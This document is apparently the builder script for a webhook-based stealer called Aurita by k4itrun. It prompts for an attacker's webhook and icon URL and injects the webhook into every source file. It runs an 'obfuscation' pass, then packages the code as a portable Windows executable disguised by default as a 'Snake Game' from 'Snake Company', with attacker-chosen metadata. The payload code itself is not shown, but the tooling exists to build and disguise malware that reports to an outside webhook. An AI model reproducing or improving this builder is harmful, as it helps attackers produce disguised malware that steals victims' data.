const {
    decodeBase64,
    isWebhook,
    isLinkIcon
} = require("./utils.js");

const { 
    build, 
    Platform, 
    Arch 
} = require("electron-builder");

const { spawnSync } = require("child_process");
const imageToIco    = require("image-to-ico");
const readline      = require("readline");
const gradient      = require("gradient-string");
const chalk         = require("chalk-animation");
const axios         = require("axios");
const path          = require("path");
const fs            = require("fs");

const { atlas, instagram, summer } = gradient;
const { radar } = chalk;

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

let currentQst = 0;

const SRC_DIR = "./src";

const createIcon = async (exeIcon, tempImagePath, iconPath) => {
    try {
        const response = await axios.get(exeIcon,
            { responseType: 'stream' }
        );

        const writer = fs.createWriteStream(tempImagePath);
        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        const buffer = await imageToIco(tempImagePath, {
            size: [256, 256],
            quality: 100,
            greyscale: false
        });

        fs.writeFileSync(iconPath, buffer);
        fs.unlinkSync(tempImagePath);
    } catch (error) {
        console.error(`Error in createIcon: ${error.message}`);
    }
};

const createBuild = async (dest, JSON) => {
    const exeName = JSON.EXECUTABLE_NAME ?? "Aurita";
    const exeIcon = JSON.EXECUTABLE_ICON ?? "https://i.imgur.com/WkKXZSl.gif";

    const tempImagePath = `${process.cwd()}/build/icons/${exeName}.png`;
    const iconPath = `${process.cwd()}/build/icons/${exeName}.ico`;

    try {
        await createIcon(exeIcon, tempImagePath, iconPath);

        await build({
            "targets": Platform.WINDOWS.createTarget(null, Arch.x64),
            "config": {
                "appId": "win32",
                "productName": `${exeName}`,
                "win": {
                    "artifactName": `${exeName}.exe`,
                    "target": "portable",
                    "icon": iconPath
                },
                "compression": "normal",
                "buildVersion": "1.0.0",
                "electronVersion": "17.1.0",
                "nodeGypRebuild": false,
                "npmRebuild": true,
                "directories": {
                    "app": `${dest}`,
                    "output": `./build/dist/${exeName}`,
                },
            },
        });

        fs.unlinkSync(`./build/dist/${exeName}/builder-debug.yml`);
        fs.unlinkSync(`./build/dist/${exeName}/builder-effective-config.yaml`);

        fs.rmSync(`./build/dist/${exeName}/win-unpacked`, {
            recursive: true
        });
        fs.rmSync(`${dest}`, {
            recursive: true
        });

        fs.rename(`./build/dist/${exeName}/${exeName}.exe`, `./${exeName}.exe`, (err) => {
            if (err) {
                console.error('The file is inside "./build/dist"');
            } else {
                console.log(`Executable file as "${exeName}"`);
            }
        });

    } catch (err) {
        console.log(err)
    }
}

const createObfuscation = async (JSON) => {
    let webhook     = JSON.WEBHOOK,
        exeName     = JSON.EXECUTABLE_NAME ?? "Aurita",
        appCompany  = JSON.APP_COMPANY ?? "Snake Company",
        appFileDesc = JSON.DESC ?? "Snake Game",
        copyright   = JSON.COPYRIGHT ?? "Snake Copyright",
        version     = JSON.VERSION ?? "2.0.0",
        license     = JSON.LICENSE ?? "MIT",
        author      = JSON.AUTHOR ?? "k4itrun",
        desc        = JSON.DESC ?? "Do Do-Hee <3";

    let destDir = `./build/script/${exeName}`;

    const cloneDir = (src, dest) => {
        try {
            if (!fs.existsSync(dest)) {
                fs.mkdirSync(dest);
            }
            fs.readdirSync(src).forEach((file) => {
                let sourceFilePath = path.join(src, file);
                let destFilePath = path.join(dest, file);
                if (fs.statSync(sourceFilePath).isFile()) {
                    fs.copyFileSync(sourceFilePath, destFilePath);
                } else if (fs.statSync(sourceFilePath).isDirectory()) {
                    cloneDir(sourceFilePath, destFilePath);
                }
            });
        } catch (e) {
            console.error(e)
        }
    };

    const obfFiles = async (dir) => {
        try {
            const files = fs.readdirSync(dir);

            for (const file of files) {
                const filePath = path.join(dir, file);

                if (fs.statSync(filePath).isDirectory()) {
                    await obfFiles(filePath);
                } else if (file.endsWith(".js") && !filePath.includes("node_modules") && !file.includes("build.js")) {
                    await fs.writeFileSync(filePath, fs.readFileSync(filePath, "utf-8")); //later added better obfuscation
                }
            }
        } catch (e) {
            console.error(e)
        }
    };


    const replaceKeys = (file) => {
        try {
            fs.writeFileSync(file, fs.readFileSync(file, "utf-8")
                .replace(/%WEBHOOK%/g, webhook)
            );
        } catch (e) {
            console.error(e)
        }
    };

    const replaceBat = (file) => {
        try {
            fs.writeFileSync(file, fs.readFileSync(file, "utf-8")
                .replace(/%DESTINATION%/g, destDir)
            );
        } catch (e) {
            console.error(e)
        }
    };

    const replaceInfos = (file) => {
        try {
            fs.writeFileSync(file, fs.readFileSync(file, "utf-8")
                .replace(/%APPCOMPAGNYNAME%/g, appCompany)
                .replace(/%FILEDESCRIB%/g, appFileDesc)
                .replace(/%COPYRIGHT%/g, copyright)
                .replace(/%VERSIONPRODUCT%/g, version)
                .replace(/%VERSION%/g, version)
                .replace(/%LICENSE%/g, license)
                .replace(/%AUTHOR%/g, author)
                .replace(/%DESCRIPTION%/g, desc)
            );
        } catch (e) {
            console.error(e)
        }
    };

    const traverse = (dir) => {
        try {
            fs.readdirSync(dir).forEach((file) => {
                const filePath = path.join(dir, file);
                if (fs.statSync(filePath).isDirectory()) {
                    traverse(filePath)
                } else if (file.endsWith(".js") && !filePath.includes("node_modules")) {
                    replaceKeys(filePath)
                } else if (file.endsWith(".json") && !filePath.includes("node_modules")) {
                    replaceInfos(filePath)
                } else if (file.endsWith("build.bat")) {
                    replaceBat(filePath)
                }
            });
        } catch (e) {
            console.error(e)
        }
    };

    cloneDir(SRC_DIR, destDir);
    await traverse(destDir);
    await obfFiles(destDir);

    return destDir;
}

async function ask(qst) {
    try {
        currentQst++;

        return (await new Promise((resolve, reject) => {
            rl.question(atlas(`Question ${currentQst}: ${qst}`), (ans) => {
                resolve(ans);
            });
        })).trim();
    } catch (e) {
        console.error(e);
        return '';
    }
}

async function createFucking() {
    const JSON = {};
    const BANNER_AURITA = decodeBase64("CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW0F1cmFUaGVtZXNdCgriloTiloTiloQgICAgICDiloggICAg4paI4paIIOKWiOKWiOKWgOKWiOKWiOKWiCAg4paE4paE4paEICAgIOKWhOKWhOKWhOKWiOKWiOKWiOKWiOKWiOKWk+KWiOKWiOKWkSDilojilojilpPilojilojilojilojilogg4paI4paI4paI4paEIOKWhOKWiOKWiOKWiOKWk+KWiOKWiOKWiOKWiOKWiCAg4paI4paI4paI4paI4paI4paICuKWkuKWiOKWiOKWiOKWiOKWhCAgICDilojiloggIOKWk+KWiOKWiOKWk+KWiOKWiCDilpIg4paI4paI4paS4paI4paI4paI4paI4paEICDilpMgIOKWiOKWiOKWkiDilpPilpPilojilojilpEg4paI4paI4paT4paIICAg4paA4paT4paI4paI4paS4paA4paI4paAIOKWiOKWiOKWk+KWiCAgIOKWgOKWkuKWiOKWiCAgICDilpIK4paS4paI4paIICDiloDilojiloQg4paT4paI4paIICDilpLilojilojilpPilojilogg4paR4paE4paIIOKWkuKWiOKWiCAg4paA4paI4paE4paSIOKWk+KWiOKWiOKWkSDilpLilpLilojilojiloDiloDilojilojilpLilojilojiloggIOKWk+KWiOKWiCAgICDilpPilojilojilpLilojilojiloggIOKWkSDilpPilojilojiloQgICAK4paR4paI4paI4paE4paE4paE4paE4paI4paI4paT4paT4paIICDilpHilojilojilpLilojilojiloDiloDilojiloQg4paR4paI4paI4paE4paE4paE4paE4paI4paRIOKWk+KWiOKWiOKWkyDilpHilpHilpPilogg4paR4paI4paI4paS4paT4paIICDiloTilpLilojiloggICAg4paS4paI4paI4paS4paT4paIICDiloQgIOKWkiAgIOKWiOKWiOKWkgrilpPiloggICDilpPilojilojilpLilpLilojilojilojilojilojilpPilpHilojilojilpMg4paS4paI4paI4paS4paT4paIICAg4paT4paI4paI4paS4paS4paI4paI4paSIOKWkeKWkeKWk+KWiOKWkuKWkeKWiOKWiOKWkeKWkuKWiOKWiOKWiOKWiOKWkuKWiOKWiOKWkiAgIOKWkeKWiOKWiOKWkeKWkuKWiOKWiOKWiOKWiOKWkuKWiOKWiOKWiOKWiOKWiOKWiOKWkuKWkgrilpLilpIgICDilpPilpLilojilpHilpLilpPilpIg4paSIOKWkuKWkSDilpLilpMg4paR4paS4paT4paR4paS4paSICAg4paT4paS4paI4paR4paSIOKWkeKWkSAgIOKWkiDilpHilpHilpLilpHilpHilpEg4paS4paRIOKWkSDilpLilpEgICDilpEgIOKWkeKWkSDilpLilpEg4paSIOKWkuKWk+KWkiDilpIg4paRCuKWkiAgIOKWkuKWkiDilpHilpHilpLilpEg4paRIOKWkSAg4paR4paSIOKWkSDilpLilpEg4paSICAg4paS4paSIOKWkSAg4paRICAgIOKWkiDilpHilpLilpEg4paR4paRIOKWkSAg4paRICDilpEgICAgICDilpHilpEg4paRICDilpEg4paR4paSICDilpEg4paRCuKWkSAgIOKWkiAgIOKWkeKWkeKWkSDilpEg4paRICDilpHilpEgICDilpEgIOKWkSAgIOKWkiAgIOKWkSAgICAgIOKWkSAg4paR4paRIOKWkSAg4paRICDilpEgICAgICDilpEgICAgIOKWkSAg4paRICDilpEgIOKWkQrilpEgIOKWkSAg4paRICAgICAgIOKWkSAgICAgICAgICDilpEgIOKWkSAgICAgICDilpEgIOKWkSAg4paRICDilpEgIOKWkSAgICAgIOKWkSAgICAg4paRICDilpEgICAgIOKWkQogICAgICAgCQlBdXJhVGhlbWVzIEJ5IEs0aXRydW4gfCBodHRwczovL2Rpc2NvcmQuZ2cvYXVyYXRoZW1lcwkJCg");

    try {
        console.clear();

        radar(BANNER_AURITA).start();

        setTimeout(async () => {

            radar(summer(BANNER_AURITA)).stop();

            spawnSync(path.join(__dirname, SRC_DIR.replace("./", ""), "install.bat"), [], {
                cwd: path.join(__dirname, SRC_DIR.replace("./", "")),
                stdio: "inherit",
            });

            console.clear();
            console.log(instagram(BANNER_AURITA));

            let webhook = await ask("Add your \"WEBHOOK\": ");
            while (!isWebhook(webhook)) {
                webhook = await ask("Add a \"WEBHOOK\" validity: ");
            }

            let exIcon = await ask("Please specify the \"ICON\" using a url with the extensions (Png, Jpg, WebP): ");
            while (!isLinkIcon(exIcon)) {
                exIcon = await ask("Specify a valid link for your \"ICON\" the extensions (Png, Jpg, WebP): ");
            }

            JSON.WEBHOOK         = webhook;
            JSON.EXECUTABLE_ICON = exIcon;
            JSON.EXECUTABLE_NAME = await ask("Please specify your 'EXE' file \"Name\": ");
            JSON.APP_COMPANY     = await ask("Please specify your 'EXE' file \"App Company\": ");
            JSON.COPYRIGHT       = await ask("Please specify your 'EXE' file \"Legal Copyright\": ");
            JSON.LICENSE         = await ask("Please specify your 'EXE' file \"License\": ");
            JSON.AUTHOR          = await ask("Please specify your 'EXE' file \"Author\": ");
            JSON.DESC            = await ask("Please specify your 'EXE' file \"Description\": ");

            rl.close();
            console.clear();

            try {
                console.log("Obfuscation...")
                const obfPath = await createObfuscation(JSON);

                console.log("Building...")
                await createBuild(obfPath, JSON);

                console.log("Filled...")
            } catch (e) {
                console.error(e)
            }
        }, 5000);

    } catch (e) {
        console.error(e)
    }
}

createFucking();